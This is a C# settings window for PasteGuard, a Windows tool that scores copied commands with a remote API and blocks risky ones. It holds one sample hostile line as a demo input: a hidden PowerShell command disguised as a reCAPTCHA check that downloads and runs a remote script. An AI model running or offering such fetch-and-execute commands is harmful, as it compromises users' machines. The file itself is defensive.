using System.Diagnostics;

namespace PasteGuard;

/// <summary>Settings window: API key, block threshold, options, and a "try it" box.</summary>
internal sealed class SettingsForm : Form
{
    private const string KeysUrl = "https://console.typesafe.ai/keys";
    internal const string SampleAttack =
        "powershell -w hidden -c \"iex (irm https://example.com/verify.ps1)\"   # I am not a robot - reCAPTCHA Verification ID: 4821";

    private readonly Settings _settings;
    private readonly JevClient _jev;
    private readonly TextBox _key;
    private readonly Label _keyStatus;
    private readonly Button _testKey;
    private readonly TrackBar _threshold;
    private readonly Label _thresholdValue;
    private readonly CheckBox _startup;
    private readonly ComboBox _onError;
    private readonly TextBox _tryText;
    private readonly Button _tryButton;
    private readonly Label _tryResult;
    private bool _forgetAllowed;

    public event Action? Saved;

    /// <summary>Raised when a key passes "Test key"; the key is stored right away.</summary>
    public event Action? KeySaved;

    private readonly FlowLayoutPanel _root;
    private bool _saving;

    public SettingsForm(Settings settings, JevClient jev)
    {
        _settings = settings;
        _jev = jev;

        Text = "PasteGuard: Settings";
        Font = SystemFonts.MessageBoxFont ?? Font;
        AutoScaleMode = AutoScaleMode.Font;
        FormBorderStyle = FormBorderStyle.FixedDialog;
        MaximizeBox = false;
        MinimizeBox = false;
        StartPosition = FormStartPosition.CenterScreen;
        AutoScroll = true;

        var root = _root = new FlowLayoutPanel
        {
            FlowDirection = FlowDirection.TopDown,
            WrapContents = false,
            AutoSize = true,
            AutoSizeMode = AutoSizeMode.GrowAndShrink,
            Location = new Point(14, 14),
            Margin = new Padding(0, 0, 14, 14),
        };
        Controls.Add(root);

        // 1. API key
        root.Controls.Add(Heading("1. Your Jev API key"));
        root.Controls.Add(Note("Paste your own key. It is stored encrypted for your Windows account and only sent to api.typesafe.ai."));
        _key = new TextBox { Width = 330, UseSystemPasswordChar = true, Text = settings.ApiKey };
        _testKey = new Button { Text = "Test key", AutoSize = true };
        _testKey.Click += async (_, _) => await TestKeyAsync();
        var show = new CheckBox { Text = "Show", AutoSize = true, Margin = new Padding(6, 6, 0, 0) };
        show.CheckedChanged += (_, _) => _key.UseSystemPasswordChar = !show.Checked;
        root.Controls.Add(Row(_key, _testKey, show));
        var link = new LinkLabel { Text = "Get a key at console.typesafe.ai/keys", AutoSize = true };
        link.LinkClicked += (_, _) => OpenUrl(KeysUrl);
        _keyStatus = new Label { AutoSize = true, MaximumSize = new Size(470, 0) };
        root.Controls.Add(link);
        root.Controls.Add(_keyStatus);

        // 2. Threshold
        root.Controls.Add(Heading("2. Block threshold"));
        root.Controls.Add(Note("Copied commands with a risk score at or above this number (out of 100) are removed from the clipboard."));
        _threshold = new TrackBar
        {
            Minimum = Settings.MinThreshold,
            Maximum = Settings.MaxThreshold,
            TickFrequency = 10,
            SmallChange = 1,
            LargeChange = 5,
            Width = 330,
            Value = settings.Threshold,
        };
        _thresholdValue = new Label { AutoSize = true, Margin = new Padding(6, 12, 0, 0), Font = new Font(Font, FontStyle.Bold) };
        _threshold.ValueChanged += (_, _) => UpdateThresholdLabel();
        var reset = new Button { Text = $"Use recommended ({Settings.DefaultThreshold})", AutoSize = true };
        reset.Click += (_, _) => _threshold.Value = Settings.DefaultThreshold;
        root.Controls.Add(Row(_threshold, _thresholdValue));
        root.Controls.Add(Note("50 = strict (more false alarms)   ·   70 = recommended   ·   85+ = only obvious attacks"));
        root.Controls.Add(reset);
        UpdateThresholdLabel();

        // 3. Options
        root.Controls.Add(Heading("3. Options"));
        _startup = new CheckBox { Text = "Start PasteGuard when I sign in to Windows", AutoSize = true, Checked = settings.StartWithWindows };
        root.Controls.Add(_startup);
        _onError = new ComboBox { DropDownStyle = ComboBoxStyle.DropDownList, Width = 300 };
        _onError.Items.AddRange(new object[] { "Allow the copy (recommended)", "Block command-like text" });
        _onError.SelectedIndex = settings.OnApiError == ApiErrorAction.Block ? 1 : 0;
        root.Controls.Add(Row(new Label { Text = "If Jev can't be reached:", AutoSize = true, Margin = new Padding(0, 6, 6, 0) }, _onError));
        var allowedLabel = new Label { AutoSize = true, Margin = new Padding(0, 8, 6, 0) };
        var forget = new Button { Text = "Forget all", AutoSize = true, Enabled = settings.AllowedCommands.Count > 0 };
        void UpdateAllowed() => allowedLabel.Text = _forgetAllowed
            ? "Always-allowed commands: will be cleared when you click Save"
            : $"Always-allowed commands: {settings.AllowedCommands.Count}";
        forget.Click += (_, _) => { _forgetAllowed = true; forget.Enabled = false; UpdateAllowed(); };
        UpdateAllowed();
        root.Controls.Add(Row(allowedLabel, forget));

        // 4. Threat activity
        root.Controls.Add(Heading("4. Threat activity"));
        var since = DateTime.Now.AddDays(-30);
        var blocked30 = Log.ReadEntries().Count(e => e.Kind.StartsWith("BLOCKED", StringComparison.Ordinal) && e.Time >= since);
        var activityLabel = new Label
        {
            Text = blocked30 == 0 ? "No threats blocked in the last 30 days." : $"{blocked30} threat{(blocked30 == 1 ? "" : "s")} blocked in the last 30 days.",
            AutoSize = true,
            Margin = new Padding(0, 8, 6, 0),
        };
        var viewActivity = new Button { Text = "View activity…", AutoSize = true };
        viewActivity.Click += (_, _) => ActivityForm.ShowSingle(Icon);
        root.Controls.Add(Row(activityLabel, viewActivity));

        // Try it
        root.Controls.Add(Heading("Try it"));
        root.Controls.Add(Note("Paste any text to see its score. Nothing is run. The sample below is a harmless fake attack."));
        _tryText = new TextBox { Multiline = true, Width = 470, Height = 54, ScrollBars = ScrollBars.Vertical, Text = SampleAttack };
        _tryButton = new Button { Text = "Score this text", AutoSize = true };
        _tryButton.Click += async (_, _) => await TryAsync();
        _tryResult = new Label { AutoSize = true, MaximumSize = new Size(360, 0), Margin = new Padding(6, 6, 0, 0) };
        root.Controls.Add(_tryText);
        root.Controls.Add(Row(_tryButton, _tryResult));

        // Buttons
        var save = new Button { Text = "Save", AutoSize = true, MinimumSize = new Size(90, 0) };
        save.Click += (_, _) => SaveAndClose();
        var cancel = new Button { Text = "Cancel", AutoSize = true, MinimumSize = new Size(90, 0), DialogResult = DialogResult.Cancel };
        cancel.Click += (_, _) => { _saving = true; Close(); }; // Cancel = discard, no prompt
        CancelButton = cancel;
        var buttons = Row(save, cancel);
        buttons.Margin = new Padding(0, 16, 0, 0);
        buttons.Anchor = AnchorStyles.Right;
        root.Controls.Add(buttons);

        if (string.IsNullOrWhiteSpace(settings.ApiKey))
            SetStatus(_keyStatus, "Welcome! Paste your Jev API key above and click Test key.", Color.DarkGoldenrod);

        AcceptButton = null;
        Load += (_, _) => FitToScreen();
        FormClosing += OnFormClosing;
    }

    /// <summary>Sizes the window to its content, but never taller than the screen (it scrolls instead).</summary>
    private void FitToScreen()
    {
        var area = Screen.FromPoint(Cursor.Position).WorkingArea;
        var content = _root.PreferredSize;
        var scrollbar = SystemInformation.VerticalScrollBarWidth;
        var width = content.Width + 28 + scrollbar;
        var height = content.Height + 28;
        var chrome = Size - ClientSize;
        var maxClientHeight = area.Height - chrome.Height - 20;
        ClientSize = new Size(width, Math.Min(height, maxClientHeight));
        Location = new Point(area.Left + (area.Width - Width) / 2, area.Top + Math.Max(0, (area.Height - Height) / 2));
    }

    private bool HasUnsavedChanges =>
        _key.Text.Trim() != _settings.ApiKey ||
        _threshold.Value != _settings.Threshold ||
        _startup.Checked != _settings.StartWithWindows ||
        (_onError.SelectedIndex == 1) != (_settings.OnApiError == ApiErrorAction.Block) ||
        _forgetAllowed;

    private void OnFormClosing(object? sender, FormClosingEventArgs e)
    {
        if (_saving || !HasUnsavedChanges) return;
        var answer = MessageBox.Show(this, "Save your changes before closing?", "PasteGuard",
            MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
        if (answer == DialogResult.Cancel) e.Cancel = true;
        else if (answer == DialogResult.Yes) Apply();
    }

    private void UpdateThresholdLabel() =>
        _thresholdValue.Text = _threshold.Value == Settings.DefaultThreshold
            ? $"{_threshold.Value} (recommended)"
            : _threshold.Value.ToString();

    private async Task TestKeyAsync()
    {
        _testKey.Enabled = false;
        SetStatus(_keyStatus, "Testing…", SystemColors.GrayText);
        try
        {
            var score = await _jev.ScoreAsync(_key.Text, _settings.Model, "git status");
            _settings.ApiKey = _key.Text;
            KeySaved?.Invoke();
            SetStatus(_keyStatus, $"✓ Key works and is saved. (A harmless test command scored {score}/100.)", Color.ForestGreen);
        }
        catch (JevException ex)
        {
            SetStatus(_keyStatus, "✗ " + ex.Message, Color.Firebrick);
        }
        finally
        {
            _testKey.Enabled = true;
        }
    }

    private async Task TryAsync()
    {
        var text = _tryText.Text;
        var pre = PreFilter.Check(text);
        if (!pre.IsCommandLike)
        {
            SetStatus(_tryResult, "Not command-like, so it's allowed without being sent to Jev.", SystemColors.ControlText);
            return;
        }

        _tryButton.Enabled = false;
        SetStatus(_tryResult, "Scoring…", SystemColors.GrayText);
        try
        {
            var score = await _jev.ScoreAsync(_key.Text, _settings.Model, text);
            var blocked = score >= _threshold.Value;
            SetStatus(_tryResult,
                blocked
                    ? $"Score {score}/100: would be BLOCKED (threshold {_threshold.Value})."
                    : $"Score {score}/100: would be allowed (threshold {_threshold.Value}).",
                blocked ? Color.Firebrick : Color.ForestGreen);
        }
        catch (JevException ex)
        {
            SetStatus(_tryResult, "✗ " + ex.Message, Color.Firebrick);
        }
        finally
        {
            _tryButton.Enabled = true;
        }
    }

    private void SaveAndClose()
    {
        Apply();
        _saving = true;
        Close();
    }

    private void Apply()
    {
        _settings.ApiKey = _key.Text;
        _settings.Threshold = _threshold.Value;
        _settings.StartWithWindows = _startup.Checked;
        _settings.OnApiError = _onError.SelectedIndex == 1 ? ApiErrorAction.Block : ApiErrorAction.Restore;
        if (_forgetAllowed) _settings.AllowedCommands.Clear();
        _forgetAllowed = false;
        Saved?.Invoke();
    }

    private static Label Heading(string text) => new()
    {
        Text = text,
        AutoSize = true,
        Font = new Font(SystemFonts.MessageBoxFont ?? DefaultFont, FontStyle.Bold),
        Margin = new Padding(0, 12, 0, 2),
    };

    private static Label Note(string text) => new()
    {
        Text = text,
        AutoSize = true,
        MaximumSize = new Size(470, 0),
        ForeColor = SystemColors.GrayText,
        Margin = new Padding(0, 0, 0, 4),
    };

    private static FlowLayoutPanel Row(params Control[] controls)
    {
        var row = new FlowLayoutPanel { AutoSize = true, AutoSizeMode = AutoSizeMode.GrowAndShrink, WrapContents = false, Margin = new Padding(0) };
        row.Controls.AddRange(controls);
        return row;
    }

    private static void SetStatus(Label label, string text, Color color)
    {
        label.Text = text;
        label.ForeColor = color;
    }

    private static void OpenUrl(string url)
    {
        try { Process.Start(new ProcessStartInfo(url) { UseShellExecute = true }); }
        catch { /* no default browser */ }
    }
}
